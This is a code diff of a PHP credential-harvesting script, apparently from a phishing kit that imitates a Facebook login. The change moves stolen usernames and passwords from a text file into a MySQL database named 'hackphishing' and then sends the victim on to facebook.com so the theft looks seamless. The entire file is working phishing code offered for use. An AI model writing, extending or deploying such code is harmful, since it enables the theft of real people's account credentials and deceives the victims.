@@ -1,6 +1,30 @@
 <?php
 include 'ip.php';
 
-file_put_contents("usuario.txt", "[CORREO]: " . $_POST['User'] . " [CONTRA]: " . $_POST['Password'] . "\n", FILE_APPEND);
+// Database connection
+$servername = "localhost";
+$username = "root";
+$password = ""; // default for XAMPP
+$dbname = "hackphishing";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+// Prepare and bind
+$stmt = $conn->prepare("INSERT INTO usuarios (correo, contra) VALUES (?, ?)");
+$stmt->bind_param("ss", $_POST['User'], $_POST['Password']);
+
+// Execute
+$stmt->execute();
+
+$stmt->close();
+$conn->close();
+
 header('Location: https://facebook.com');
 exit();
+?>
